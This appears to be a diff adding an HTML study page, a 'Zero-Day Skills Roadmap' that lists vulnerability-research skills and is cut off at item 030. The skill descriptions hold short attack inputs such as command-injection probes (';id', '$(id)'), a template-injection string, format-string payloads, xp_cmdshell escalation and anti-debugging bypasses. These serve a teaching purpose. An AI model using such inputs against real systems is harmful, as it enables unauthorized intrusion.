@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>FL.Slayer — Zero-Day Skills Roadmap</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0d0d0d;--surface:#111;--card:#161616;--border:#222;--border2:#2a2a2a;
+  --text:#e8e8e8;--muted:#888;--dim:#555;
+  --red:#ef4444;--orange:#f97316;--amber:#f59e0b;--green:#22c55e;
+  --cyan:#06b6d4;--blue:#3b82f6;--purple:#a855f7;--pink:#ec4899;
+  --red-bg:rgba(239,68,68,.08);--orange-bg:rgba(249,115,22,.08);
+  --amber-bg:rgba(245,158,11,.08);--green-bg:rgba(34,197,94,.08);
+  --cyan-bg:rgba(6,182,212,.08);--blue-bg:rgba(59,130,246,.08);
+  --purple-bg:rgba(168,85,247,.08);--pink-bg:rgba(236,72,153,.08);
+}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:14px;line-height:1.6;min-height:100vh}
+.hero{background:linear-gradient(135deg,#0d0d0d 0%,#111218 50%,#0d0d0d 100%);border-bottom:1px solid var(--border);padding:48px 24px 40px;text-align:center}
+.hero-logo{font-family:monospace;font-size:11px;color:#333;line-height:1.2;margin-bottom:24px;white-space:pre}
+.hero h1{font-size:28px;font-weight:700;background:linear-gradient(90deg,#ef4444,#f97316,#f59e0b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px}
+.hero p{color:var(--muted);font-size:15px;max-width:600px;margin:0 auto 24px}
+.stats{display:flex;gap:32px;justify-content:center;flex-wrap:wrap}
+.stat{text-align:center}
+.stat-n{font-size:28px;font-weight:700;color:var(--red)}
+.stat-l{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:.05em}
+nav{display:flex;gap:8px;flex-wrap:wrap;padding:16px 24px;border-bottom:1px solid var(--border);background:var(--surface);position:sticky;top:0;z-index:100;overflow-x:auto}
+.nav-btn{background:none;border:1px solid var(--border);color:var(--muted);padding:6px 14px;border-radius:6px;cursor:pointer;font-size:12px;white-space:nowrap;transition:all .15s}
+.nav-btn:hover,.nav-btn.active{border-color:var(--red);color:var(--red);background:var(--red-bg)}
+.container{max-width:1200px;margin:0 auto;padding:32px 24px}
+.domain{margin-bottom:56px}
+.domain-header{display:flex;align-items:center;gap:14px;margin-bottom:24px;padding-bottom:16px;border-bottom:1px solid var(--border)}
+.domain-icon{width:42px;height:42px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
+.domain-title{font-size:20px;font-weight:700}
+.domain-sub{font-size:13px;color:var(--muted);margin-top:2px}
+.skills-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:12px}
+.skill{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px;cursor:pointer;transition:all .15s;position:relative;overflow:hidden}
+.skill::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:var(--accent-color,#333)}
+.skill:hover{border-color:var(--border2);background:#181818;transform:translateY(-1px)}
+.skill-header{display:flex;align-items:flex-start;gap:10px;margin-bottom:8px}
+.skill-num{font-size:11px;font-family:monospace;color:var(--dim);min-width:36px;padding-top:2px}
+.skill-name{font-size:14px;font-weight:600;color:var(--text);flex:1}
+.skill-badge{font-size:10px;padding:2px 8px;border-radius:4px;font-weight:600;white-space:nowrap;border:1px solid}
+.badge-critical{background:rgba(239,68,68,.12);color:#ef4444;border-color:rgba(239,68,68,.3)}
+.badge-high{background:rgba(249,115,22,.12);color:#f97316;border-color:rgba(249,115,22,.3)}
+.badge-advanced{background:rgba(168,85,247,.12);color:#a855f7;border-color:rgba(168,85,247,.3)}
+.badge-core{background:rgba(59,130,246,.12);color:#3b82f6;border-color:rgba(59,130,246,.3)}
+.skill-desc{font-size:12px;color:var(--muted);margin-left:46px;line-height:1.5}
+.skill-tags{display:flex;gap:6px;flex-wrap:wrap;margin:10px 0 0 46px}
+.tag{font-size:10px;color:var(--dim);background:#1a1a1a;border:1px solid #222;padding:2px 7px;border-radius:4px;font-family:monospace}
+.difficulty{display:flex;gap:3px;margin-left:auto;align-items:center}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--border2)}
+.dot.fill{background:var(--accent-color,#555)}
+.section-label{font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.08em;margin-bottom:12px;margin-left:2px}
+.skill-expanded{display:none;margin-left:46px;margin-top:10px;padding-top:10px;border-top:1px solid var(--border);font-size:12px;color:var(--muted);line-height:1.6}
+.skill-expanded.open{display:block}
+.skill-expanded ul{list-style:none;display:flex;flex-direction:column;gap:4px}
+.skill-expanded li::before{content:'→ ';color:var(--accent-color,#555)}
+.tools{display:flex;gap:5px;flex-wrap:wrap;margin-top:8px}
+.tool{font-family:monospace;font-size:10px;padding:2px 6px;background:#0d0d0d;border:1px solid #222;border-radius:3px;color:var(--cyan)}
+.roadmap{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:24px;margin-bottom:48px}
+.roadmap h2{font-size:16px;font-weight:600;margin-bottom:20px;color:var(--amber)}
+.phase-row{display:flex;align-items:flex-start;gap:16px;margin-bottom:20px;padding-bottom:20px;border-bottom:1px solid var(--border)}
+.phase-row:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0}
+.phase-num{width:36px;height:36px;border-radius:8px;background:var(--red-bg);border:1px solid rgba(239,68,68,.3);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px;color:var(--red);flex-shrink:0}
+.phase-content h3{font-size:14px;font-weight:600;margin-bottom:4px}
+.phase-content p{font-size:12px;color:var(--muted);margin-bottom:8px}
+.phase-skills{display:flex;gap:6px;flex-wrap:wrap}
+.phase-tag{font-size:11px;padding:3px 8px;background:#1a1a1a;border:1px solid #262626;border-radius:4px;color:var(--dim)}
+.progress-bar{height:2px;background:var(--border);border-radius:1px;margin-top:16px;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--red),var(--orange));border-radius:1px;transition:width .3s}
+.filter-bar{display:flex;gap:8px;margin-bottom:24px;flex-wrap:wrap;align-items:center}
+.filter-label{font-size:12px;color:var(--dim)}
+.filter-btn{background:none;border:1px solid var(--border);color:var(--dim);padding:4px 12px;border-radius:5px;cursor:pointer;font-size:11px;transition:all .15s}
+.filter-btn:hover,.filter-btn.on{background:var(--red-bg);border-color:rgba(239,68,68,.3);color:var(--red)}
+.count-badge{font-size:11px;color:var(--dim);background:#1a1a1a;padding:2px 8px;border-radius:4px;border:1px solid #222}
+footer{border-top:1px solid var(--border);padding:24px;text-align:center;color:var(--dim);font-size:12px;margin-top:48px}
+@media(max-width:600px){.skills-grid{grid-template-columns:1fr}.hero h1{font-size:20px}.hero-logo{display:none}}
+</style>
+</head>
+<body>
+
+<div class="hero">
+<pre class="hero-logo">███████╗██╗         ███████╗██╗      █████╗ ██╗   ██╗███████╗██████╗
+██╔════╝██║         ██╔════╝██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
+█████╗  ██║         ███████╗██║     ███████║ ╚████╔╝ █████╗  ██████╔╝
+██╔══╝  ██║         ╚════██║██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗
+██║     ███████╗    ███████║███████╗██║  ██║   ██║   ███████╗██║  ██║
+╚═╝     ╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝</pre>
+<h1>Zero-Day Discovery Skills Roadmap</h1>
+<p>Complete skill matrix for vulnerability research, zero-day hunting, red team operations and elite bug bounty</p>
+<div class="stats">
+  <div class="stat"><div class="stat-n" id="total-skills">0</div><div class="stat-l">Total Skills</div></div>
+  <div class="stat"><div class="stat-n" style="color:var(--red)">12</div><div class="stat-l">Domains</div></div>
+  <div class="stat"><div class="stat-n" style="color:var(--orange)">48</div><div class="stat-l">Techniques</div></div>
+  <div class="stat"><div class="stat-n" style="color:var(--amber)">127+</div><div class="stat-l">Tools Covered</div></div>
+</div>
+</div>
+
+<nav id="nav"></nav>
+
+<div class="container">
+
+<div class="roadmap">
+<h2>⚡ Zero-Day Hunter Learning Phases</h2>
+<div class="phase-row">
+  <div class="phase-num">1</div>
+  <div class="phase-content">
+    <h3>Foundation — Understand the Machine</h3>
+    <p>Master how software and systems actually work at the lowest level before trying to break them</p>
+    <div class="phase-skills">
+      <span class="phase-tag">x86-64 Assembly</span><span class="phase-tag">Memory Model</span><span class="phase-tag">C/C++</span><span class="phase-tag">OS Internals</span><span class="phase-tag">Networking Fundamentals</span>
+    </div>
+  </div>
+</div>
+<div class="phase-row">
+  <div class="phase-num">2</div>
+  <div class="phase-content">
+    <h3>Reverse Engineering — Read Without Source</h3>
+    <p>Analyze compiled binaries, firmware and closed-source software to understand behavior</p>
+    <div class="phase-skills">
+      <span class="phase-tag">Ghidra/IDA Pro</span><span class="phase-tag">x64dbg/WinDbg</span><span class="phase-tag">Frida</span><span class="phase-tag">Binary Taxonomy</span><span class="phase-tag">Anti-Analysis</span>
+    </div>
+  </div>
+</div>
+<div class="phase-row">
+  <div class="phase-num">3</div>
+  <div class="phase-content">
+    <h3>Vulnerability Classes — Know Bug Patterns</h3>
+    <p>Deep-dive each bug class: memory corruption, logic flaws, type confusion, race conditions</p>
+    <div class="phase-skills">
+      <span class="phase-tag">Buffer Overflow</span><span class="phase-tag">UAF</span><span class="phase-tag">Type Confusion</span><span class="phase-tag">Integer Overflow</span><span class="phase-tag">Race Conditions</span>
+    </div>
+  </div>
+</div>
+<div class="phase-row">
+  <div class="phase-num">4</div>
+  <div class="phase-content">
+    <h3>Discovery Techniques — Find New Bugs</h3>
+    <p>Fuzzing, symbolic execution, taint analysis, code auditing, patch diffing</p>
+    <div class="phase-skills">
+      <span class="phase-tag">AFL++</span><span class="phase-tag">libFuzzer</span><span class="phase-tag">CodeQL</span><span class="phase-tag">Taint Analysis</span><span class="phase-tag">Variant Analysis</span>
+    </div>
+  </div>
+</div>
+<div class="phase-row">
+  <div class="phase-num">5</div>
+  <div class="phase-content">
+    <h3>Exploitation — Turn Bugs into PoCs</h3>
+    <p>Develop reliable exploits, bypass mitigations, chain vulnerabilities for full impact</p>
+    <div class="phase-skills">
+      <span class="phase-tag">ROP/JOP Chains</span><span class="phase-tag">Heap Feng Shui</span><span class="phase-tag">KASLR/ASLR Bypass</span><span class="phase-tag">Sandbox Escape</span><span class="phase-tag">Privilege Escalation</span>
+    </div>
+  </div>
+</div>
+<div class="phase-row">
+  <div class="phase-num">6</div>
+  <div class="phase-content">
+    <h3>Specialization — Target a Domain</h3>
+    <p>Browser engines, kernels, mobile, IoT/embedded, cloud, network protocols</p>
+    <div class="phase-skills">
+      <span class="phase-tag">Browser V8/SpiderMonkey</span><span class="phase-tag">Linux Kernel</span><span class="phase-tag">Android/iOS</span><span class="phase-tag">RTOS/Firmware</span><span class="phase-tag">Cloud APIs</span>
+    </div>
+  </div>
+</div>
+</div>
+
+<div class="filter-bar">
+  <span class="filter-label">Filter:</span>
+  <button class="filter-btn on" onclick="filterSkills('all')">All</button>
+  <button class="filter-btn" onclick="filterSkills('critical')">Critical</button>
+  <button class="filter-btn" onclick="filterSkills('high')">High</button>
+  <button class="filter-btn" onclick="filterSkills('advanced')">Advanced</button>
+  <button class="filter-btn" onclick="filterSkills('core')">Core</button>
+  <span class="count-badge" id="skill-count">Loading...</span>
+</div>
+
+<div id="domains-container"></div>
+
+</div>
+
+<footer>FL.Slayer Zero-Day Skills Roadmap &nbsp;|&nbsp; For authorized security research only &nbsp;|&nbsp; by Khatim</footer>
+
+<script>
+const DOMAINS = [
+{
+  id:"foundations", title:"Systems & Low-Level Foundations", sub:"The bedrock skills every zero-day researcher must master first",
+  color:"#3b82f6", icon:"🧠",
+  skills:[
+    {n:"001",name:"x86-64 Assembly Language",badge:"core",diff:3,desc:"Read, write and trace x86-64 assembly — registers, calling conventions, memory addressing, stack frames",tags:["assembly","x64","registers","ABI"],tools:["nasm","objdump","gdb","radare2"],details:["Understand all general-purpose registers and their roles in the System V ABI","Master the stack frame layout: RSP, RBP, local variables, saved registers","Read compiler output from GCC/Clang and understand optimization artifacts","Trace through function prologues/epilogues and calling conventions","Identify unsafe patterns: strcpy, memcpy without bounds, integer truncation"]},
+    {n:"002",name:"ARM/AArch64 Assembly",badge:"high",diff:3,desc:"ARM64 instruction set for mobile and embedded zero-day research — critical for iOS/Android targets",tags:["arm64","aarch64","mobile","apple-silicon"],tools:["Ghidra","IDA Pro","armcc"],details:["Understand ARM load-store architecture and register conventions (X0-X7 args)","Master condition codes, barrel shifter, and thumb/thumb2 interop","Analyze iOS ARM64e PAC (pointer authentication) protected code","Read ARMv8.x memory model and acquire/release semantics for race condition analysis"]},
+    {n:"003",name:"Memory Model & Heap Internals",badge:"critical",diff:4,desc:"Deep understanding of glibc malloc, Windows heap, jemalloc — foundation for heap exploitation",tags:["heap","glibc","malloc","tcache","fastbin"],tools:["pwndbg","pwntools","gef","vmmap"],details:["glibc malloc: chunks, bins (fast, small, large, unsorted), tcache per-thread caches","Understand chunk metadata: prev_size, size field, PREV_INUSE, IS_MMAPPED flags","Track heap allocations visually: use heap command in pwndbg during exploit dev","Windows segment heap: frontend (LFH), backend allocators, VS segments","Identify use-after-free, double-free, heap overflow patterns in allocation patterns"]},
+    {n:"004",name:"OS Kernel Architecture (Linux)",badge:"critical",diff:5,desc:"Linux kernel internals: memory management, syscalls, process/thread model, kernel modules",tags:["kernel","syscall","kASLR","namespaces","cgroups"],tools:["crash","ftrace","bpftrace","dmesg","/proc"],details:["Virtual memory: page tables (PGD→P4D→PUD→PMD→PTE), TLB, huge pages","Kernel/user space boundary: syscall interface, KPTI, SMEP/SMAP enforcement","Process model: task_struct, mm_struct, virtual memory areas (VMAs)","Kernel module internals: init/exit, symbol resolution, module signing","Key attack surfaces: syscall handlers, kernel drivers, network stack, file systems"]},
+    {n:"005",name:"Windows Internals",badge:"high",diff:4,desc:"Windows kernel, object manager, security model, WinAPI internals for Windows zero-day research",tags:["windows","ntapi","WinAPI","kernel","ETW"],tools:["WinDbg","x64dbg","Process Monitor","Process Hacker"],details:["Windows object manager: handles, object types, reference counting, access tokens","NT kernel: executive, HAL, kernel objects, IRQL levels and DPCs","Security: ACLs/DACLs, privilege tokens, integrity levels (Low/Medium/High/System)","Memory: VAD tree, PFN database, pool allocators (NonPaged/Paged), lookaside lists","Key attack surfaces: win32k.sys, ETW, Named Pipes, ALPC, COM/DCOM, RPC"]},
+    {n:"006",name:"C/C++ Memory Safety Anti-Patterns",badge:"core",diff:3,desc:"Identify dangerous C/C++ patterns that lead to exploitable bugs",tags:["C","C++","memory-safety","undefined-behavior"],tools:["AddressSanitizer","valgrind","clang-tidy","cppcheck"],details:["Buffer overflows: strcpy/sprintf/gets without bounds, off-by-one errors","Integer issues: signed/unsigned overflow, truncation, integer type confusion","Format string bugs: user-controlled format argument in printf family","Use-after-free: pointers used after free(), dangling pointer dereferences","Type confusion: C-style casts bypassing type system, union misuse"]},
+    {n:"007",name:"Networking Protocol Internals",badge:"core",diff:3,desc:"TCP/IP stack, protocol parsing, packet framing — foundation for network protocol zero-days",tags:["TCP/IP","protocol","parsing","kernel-network"],tools:["wireshark","tcpdump","scapy","nmap"],details:["TCP state machine: SYN/SYN-ACK/ACK, FIN/TIME_WAIT, half-open connections","UDP framing and length field — classic source of parser integer overflows","TLS internals: handshake, cipher suites, certificate chain, SNI extension","HTTP/1.1 vs HTTP/2 vs HTTP/3 protocol differences and smuggling attack surfaces","DNS protocol structure: labels, pointers, EDNS — parser vulnerabilities"]},
+    {n:"008",name:"Compiler & Linker Internals",badge:"high",diff:4,desc:"How compilers transform code and what artifacts they leave — critical for RE and exploit reliability",tags:["compiler","linker","ELF","PE","DWARF"],tools:["objdump","readelf","nm","ldd","patchelf"],details:["ELF structure: .text .data .bss .got .plt sections, dynamic linking resolution","Position-independent code (PIC) and how GOT/PLT enables lazy binding","DWARF debug info: how source maps to machine code, variable locations","Compiler mitigations: stack canaries (__stack_chk_fail), CFI, SafeStack","Link-time optimization (LTO) and how it changes binary analysis workflow"]},
+  ]
+},
+{
+  id:"reverse-engineering", title:"Reverse Engineering", sub:"Analyze binaries, firmware and closed-source software without source code",
+  color:"#f97316", icon:"🔬",
+  skills:[
+    {n:"009",name:"Ghidra Static Analysis",badge:"core",diff:2,desc:"NSA's free decompiler for large-scale static analysis — first tool to open when auditing closed-source",tags:["Ghidra","static","decompiler","NSA"],tools:["Ghidra","ghidra-scripts","pyhidra"],details:["Import and auto-analyze binaries: function detection, data type recovery","Use decompiler view alongside disassembly — cross-reference constantly","Write Ghidra scripts (Java/Python) to automate pattern identification","Rename variables and functions as you understand them — build context","Custom data types: apply struct overlays to heap chunks, message formats"]},
+    {n:"010",name:"IDA Pro Mastery",badge:"high",diff:3,desc:"Industry-standard disassembler for professional vulnerability research",tags:["IDA","disassembly","IDAPython","Hex-Rays"],tools:["IDA Pro","IDAPython","idat","BinDiff"],details:["Graph view vs linear view — when to use each during analysis","IDAPython scripting: automate repetitive RE tasks, bulk rename, highlight patterns","IDA FLIRT signatures: identify library functions even when stripped","Hex-Rays decompiler: clean up pseudocode, fix variable types, assert struct pointers","BinDiff: compare two versions of a binary — identify patched vulnerability locations"]},
+    {n:"011",name:"Dynamic Analysis with x64dbg/WinDbg",badge:"core",diff:3,desc:"Debugger-driven analysis: trace execution, inspect memory, set conditional breakpoints",tags:["x64dbg","WinDbg","debugging","breakpoints"],tools:["x64dbg","WinDbg","ScyllaHide","TitanHide"],details:["Hardware breakpoints vs software INT3 — when each is detectable/invisible","Conditional breakpoints: break only when EAX==0 or when pointer in suspicious range","Memory breakpoints (hardware watchpoints): detect reads/writes to specific addresses","Dump decrypted payloads from memory after runtime unpacking","Kernel debugging with WinDbg over COM/network: !analyze -v, dt nt!_EPROCESS"]},
+    {n:"012",name:"Frida Dynamic Instrumentation",badge:"critical",diff:3,desc:"JavaScript-based dynamic instrumentation framework — hook functions at runtime on any platform",tags:["Frida","hooking","JavaScript","runtime","iOS","Android"],tools:["Frida","frida-tools","objection","r2frida"],details:["Intercept function calls: log arguments, modify return values, replace implementations","Hook native methods in iOS/Android apps — bypass certificate pinning in 3 lines","Trace memory allocations: hook malloc/free to detect UAF patterns at runtime","Custom Stalker: trace every instruction executed — find code paths never seen in static RE","Script injection into live process: spawn mode vs attach mode vs embed mode"]},
+    {n:"013",name:"Anti-Reversing Bypass",badge:"high",diff:4,desc:"Defeat packers, obfuscators, anti-debug, anti-VM, and timing checks",tags:["anti-debug","packer","obfuscation","VM","timing"],tools:["ScyllaHide","de4dot","unpac.me","x64dbg"],details:["IsDebuggerPresent, CheckRemoteDebuggerPresent — patch or NOP at API level","Hardware breakpoint detection via exception handler — use conditional hardware BPs","Timing checks: RDTSC delta, GetTickCount — patch to return consistent values","VM detection: CPUID brand string, RDTSC variance, MAC/registry artifacts — neutralize all","Obfuscation: control flow flattening, MBA expressions — use angr/miasm to deobfuscate"]},
+    {n:"014",name:"Firmware Extraction & Analysis",badge:"high",diff:4,desc:"Extract, unpack and analyze embedded firmware from routers, IoT devices, industrial systems",tags:["firmware","IoT","binwalk","JTAG","UART"],tools:["binwalk","firmwalker","Ghidra","flashrom","OpenOCD"],details:["Physical extraction: JTAG debugging interface, UART serial console, SPI/NAND flash dump","binwalk: identify and extract embedded filesystems, compressed sections, crypto artifacts","Emulate firmware with QEMU+buildroot: run the target's ARM/MIPS binary locally","Identify RTOS (FreeRTOS, VxWorks, ThreadX) and locate task scheduler structures","Find hardcoded credentials, private keys, debug backdoors in unpacked filesystems"]},
+    {n:"015",name:"Patch Diffing & Variant Analysis",badge:"critical",diff:3,desc:"Compare patched vs unpatched binaries to find the exact vulnerability — then hunt variants",tags:["patch-diff","BinDiff","Diaphora","variant-analysis"],tools:["BinDiff","Diaphora","patchdiff2","bindiffr"],details:["Binary diff workflow: normalize two versions, import both in IDA/Ghidra, run BinDiff","Identify patched function: look for added bounds check, sanitizer call, length validation","Extract the vulnerability primitive from the patch — understand the root cause precisely","Variant analysis: search the same codebase for similar patterns — find N-day siblings","Check all supported platforms/architectures for the same bug — vendor often misses one"]},
+    {n:"016",name:"Protocol Reverse Engineering",badge:"high",diff:4,desc:"Reverse undocumented binary protocols from captured traffic or client/server binaries",tags:["protocol","RE","binary","network","Wireshark"],tools:["Wireshark","Scapy","Peach Fuzzer","Capdis"],details:["Capture traffic with Wireshark, identify frame boundaries and length fields","Cross-reference packet parser in client binary — find the parsing function via XREFs","Annotate fields: magic bytes, length fields, type tags, payloads, checksums","Write Wireshark dissector in Lua for custom protocol visualization during testing","Build grammar for generative fuzzing once format is understood"]},
+  ]
+},
+{
+  id:"vuln-classes", title:"Vulnerability Classes", sub:"Every bug class you must master to discover novel zero-days",
+  color:"#ef4444", icon:"💀",
+  skills:[
+    {n:"017",name:"Stack Buffer Overflow",badge:"core",diff:2,desc:"Classic but still found — off-by-ones, unsafe string functions, fixed-size stack buffers with user input",tags:["stack","overflow","ret-addr","ROP"],tools:["pwntools","ROPgadget","pwndbg"],details:["Identify target offset: cyclic pattern in pwntools to find EIP/RIP control offset","Classic control flow hijack: overwrite return address with shellcode or ROP chain","Off-by-one: single byte overflow into saved RBP — frame pointer overwrite technique","Safe string function audit: replace strcpy/sprintf/gets — find uses via grep/CodeQL","Stack cookie bypass: leak canary via format string, partial overwrite, or brute force (fork)"]},
+    {n:"018",name:"Heap Buffer Overflow",badge:"critical",diff:5,desc:"Overflows in heap-allocated buffers — corrupt adjacent metadata to gain allocator control",tags:["heap","overflow","glibc","chunk","tcache"],tools:["pwndbg heap","pwntools","libheap"],details:["Overflow into chunk metadata: corrupt size field, fd/bk pointers in free chunks","Tcache poisoning (glibc ≥2.26): corrupt tcache->next to redirect allocation","Unsafe unlink primitive: forge prev_size and size to write-what-where via consolidation","Heap spray: fill allocator with controlled data before triggering UAF to land on payload","Safe unlinking mitigations (P->fd->bk == P check) — requires valid heap pointer for bypass"]},
+    {n:"019",name:"Use-After-Free (UAF)",badge:"critical",diff:5,desc:"Most common browser/kernel zero-day class — access freed memory that was reused for sensitive object",tags:["UAF","dangling-pointer","heap-spray","type-confusion"],tools:["AddressSanitizer","pwndbg","Frida"],details:["Root cause: object freed while reference still held — lifetime management failure","Trigger primitive: allocate object of same size in the hole left by freed object","Type confusion via UAF: reinterpret struct A's bytes as struct B — access privileged fields","Browser UAF: DOM node lifetime, event handler callbacks holding stale pointers","Kernel UAF: race condition in reference counting (kref), network socket lifetime bugs"]},
+    {n:"020",name:"Type Confusion",badge:"critical",diff:5,desc:"Object accessed as wrong type — especially powerful in JIT compilers and C++ virtual dispatch",tags:["type-confusion","vtable","JIT","V8","JavaScriptCore"],tools:["pwndbg","Frida","GDB","IDA"],details:["C++ virtual dispatch: overwrite vtable pointer via UAF — redirect all virtual calls","JIT type confusion: trick optimizer into treating float64 as pointer (V8 addrOf/fakeObj primitive)","C union misuse: write one field, read another — deliberate type confusion in parser code","JavaScript engine: confuse Map type with ArrayBuffer backing store — access any memory","COM/DCOM interface type confusion: IUnknown pointer cast without QI validation"]},
+    {n:"021",name:"Integer Overflow & Underflow",badge:"high",diff:3,desc:"Arithmetic overflow leading to allocation too small, then heap overflow — common in image/video parsers",tags:["integer","overflow","underflow","truncation","signedness"],tools:["clang -fsanitize=integer","pysec","Klee"],details:["Allocation size overflow: width*height*4 overflows 32-bit — allocate tiny buffer, overflow in loop","Signed/unsigned comparison: (int)len > 0 passes for negative len cast to size_t=huge","Integer truncation: size_t size stored in uint16_t — truncated value used for allocation","Off-by-one in loop bounds: i <= len instead of i < len — read/write one byte past buffer","Underflow: unsigned subtraction wrapping — (uint)(small - large) becomes huge positive"]},
+    {n:"022",name:"Format String Vulnerabilities",badge:"core",diff:2,desc:"User-controlled format string in printf family — arbitrary read via %s/%n, arbitrary write via %n",tags:["format-string","printf","arbitrary-write","RELRO"],tools:["pwntools","formatstring","GDB"],details:["%p/%p/%p: leak stack values including canary, saved RBP, return address, libc pointer","Arbitrary read: %9999$s — read string at stack offset 9999 (walk stack to find libc)","Arbitrary write: %NNNc%n — write value NN to address on stack (DWORD/QWORD width variants)","pwntools FmtStr: automate format string exploit generation — find offset and chain writes","Defense: FULL RELRO prevents GOT overwrites — must target other write targets (atexit, __malloc_hook)"]},
+    {n:"023",name:"Race Conditions & TOCTOU",badge:"critical",diff:5,desc:"Time-of-Check-Time-of-Use races in kernel, file systems and concurrent server code",tags:["race","TOCTOU","concurrency","kernel","threads"],tools:["ThreadSanitizer","bpftrace","ftrace","syz-stress"],details:["TOCTOU in privileged operations: check path, symlink swapped before open() — symlink attack","Kernel race: reference count decrement and use in different threads — UAF via race","File system race: access(filename) then open(filename) in setuid binary — classic privesc","Double-fetch: kernel reads userspace pointer twice — race to swap value between fetches","Exploit races with userfaultfd(2): pause kernel in fault handler, win the race every time"]},
+    {n:"024",name:"NULL Pointer Dereference",badge:"high",diff:3,desc:"Dereferencing NULL — exploitable in kernel (mmap at 0x0) and some userspace configurations",tags:["NULL","dereference","kernel","mmap_min_addr"],tools:["pwndbg","kdbg","syzkaller"],details:["Kernel NULL deref: write shellcode at userspace 0x0 (requires mmap_min_addr=0 or CAP_SYS_RAWIO)","Function pointer at offset 0: NULL object pointer + virtual function call = SIGSEGV at offset","NULL in struct field: object allocated but critical field not initialized before use","Exploit primitive: control data at address 0 — mmap(0, ..., MAP_FIXED) in kernel module context","Modern mitigation: mmap_min_addr=65536 — most NULL deref bugs = DoS only, not exploitable"]},
+    {n:"025",name:"Uninitialized Memory",badge:"high",diff:4,desc:"Uninitialized stack/heap values leaking kernel pointers or containing attacker-controlled data",tags:["uninit","memory","kernel-leak","KMSAN","valgrind"],tools:["valgrind","KMSAN","MemorySanitizer","Frida"],details:["Stack variable not initialized before return — leaks saved values from previous stack frames","Heap allocation without memset: struct fields from previous free()'d object still present","Kernel info leak: copy_to_user() of struct with uninitialized padding bytes — leak kernel pointers","Bypass KASLR: a single kernel pointer leak from uninitialized memory enables full exploit chain","Tool: Kernel Memory Sanitizer (KMSAN) flags kernel uninitialized reads — fuzz with syzkaller"]},
+    {n:"026",name:"Memory Disclosure / Info Leaks",badge:"critical",diff:3,desc:"Leak sensitive pointers to defeat ASLR/KASLR — the first step in any modern exploit chain",tags:["info-leak","ASLR","KASLR","out-of-bounds-read","format-string"],tools:["pwntools","pwndbg","GDB"],details:["Out-of-bounds read: read array past end into adjacent heap/stack — expose pointers","Format string %p: walk stack pointer chain — find saved return address into libc","Heap spray + UAF read: read bytes from deallocated-then-reallocated chunk — kernel base leak","JavaScript ArrayBuffer OOB: read past typed array bounds to expose V8 internal pointers","Combine: heap address → libc base → stack address → defeat PIE/ASLR/KASLR all in one chain"]},
+    {n:"027",name:"Command Injection",badge:"core",diff:1,desc:"User input passed to shell — system(), popen(), eval() without sanitization",tags:["cmdi","shell","system()","injection"],tools:["commix","burpsuite","manual"],details:["OS command injection: user input in system('ping '+input) — inject with ';id' or '$(id)'","PHP: exec/shell_exec/passthru/system/popen — all sink functions for audit","Server-side template injection escalating to RCE — Jinja2 {{config.__class__}}","SSJI in Node.js: eval() / Function() / vm.runInThisContext() with user input","Argument injection: inject into argument of safe binary — curl --output, git clone ssh://"]},
+    {n:"028",name:"SQL Injection Advanced",badge:"core",diff:2,desc:"Beyond UNION SELECT — second-order, OOB exfiltration, stored procedures, filter bypass",tags:["SQLi","blind","OOB","DNS-exfil","second-order"],tools:["sqlmap","ghauri","manual"],details:["Second-order SQLi: stored payload executed later in different query context — harder to find","Time-based blind: SLEEP(5) and WAITFOR DELAY — extract data bit by bit via timing","DNS/OOB exfiltration: LOAD_FILE() + INTO OUTFILE — bypass firewalled blind injection","Stacked queries in MSSQL: execute multiple statements — escalate to xp_cmdshell","WAF bypass: comment insertion /**/, case variation, Unicode normalization, HTTP parameter pollution"]},
+    {n:"029",name:"Logic & Business Logic Flaws",badge:"high",diff:3,desc:"Authorization bypasses, state machine violations, price manipulation — hardest to find automatically",tags:["logic","auth","IDOR","state-machine","bypass"],tools:["Burp Suite","manual","custom-scripts"],details:["Horizontal privilege: change numeric ID in request — access another user's data (IDOR)","Vertical privilege: reach admin function without admin role — missing server-side auth check","Race condition in payment: click Pay twice simultaneously — charge once, get twice","Negative quantity: set quantity=-1 in cart — add money to account instead of charge","State machine bypass: skip multi-step checkout step — place order without payment"]},
+    {n:"030",name:"Deserialization Vulnerabilities",badge:"high",diff:4,desc:"Untrusted deserialization leading to arbitrary code execution — Java, PHP, Python, .NET",tags:["deserialization","RCE","gadget-chain","Java","PHP"],tools:["ysoserial","PHPGGC","marshalsec","GadgetProbe"],details:["Java deserialization: ObjectInputStream.readObject() + gadget chain via Commons Collections","PHP unserialize(): __wakeup()/__destruct() magic method chains — POP gadget hunting","Python pickle: pickle.loads() on untrusted data — os.system() in __reduce__",".NET BinaryFormatter: ViewState MAC bypass → RCE via TypeConfuseDelegate chain","JSON type confusion: JSON.parse() doesn't deserialize, but jackson/gson with type info does"]},
